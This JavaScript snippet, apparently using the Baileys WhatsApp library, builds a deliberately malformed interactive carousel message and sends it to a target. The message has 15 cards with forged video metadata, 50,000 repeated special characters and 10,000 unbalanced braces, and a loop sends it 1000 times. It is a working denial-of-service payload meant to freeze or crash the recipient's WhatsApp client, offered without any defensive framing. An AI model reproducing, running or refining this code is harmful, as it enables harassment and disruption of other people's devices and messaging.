async function Q(sock, target) {
  const cardTemplate = {
    header: {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
        fileLength: { low: 4194304, high: 2560, unsigned: true },
        seconds: 999999999,
        mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
        height: 9999,
        width: 9999,
        fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
        directPath:
          "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1751081957"
      },
      hasMediaAttachment: true,
    },
    body: {
      text: "ꦽ".repeat(50000),
    },
    nativeFlowMessage: {
      buttons: [
        {
          name: "single_select",
          buttonParamsJson: ""
        },
        {
        name:"address_message",
        buttonParamsJson: JSON.stringify({
        status: true
        })
        }
      ],
      messageParamJson: "{".repeat(10000),
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(50000),
            },
            carouselMessage: {
              cards: Array(15).fill(cardTemplate),
              messageVersion: 1,
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
              stanzaId: "StxId" + Math.floor(Math.random() * 99999),
              mentionedJid: ["13135550002@s.whatsapp.net"],
            },
          },
        },
      },
    },
    {}
  );
  console.log("Message sent successfully!");
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
  });
}

for (let x = 0; x < 1000; x++) {
  await Q(client, target);
  await new Promise(res => setTimeout(res, 500));
}
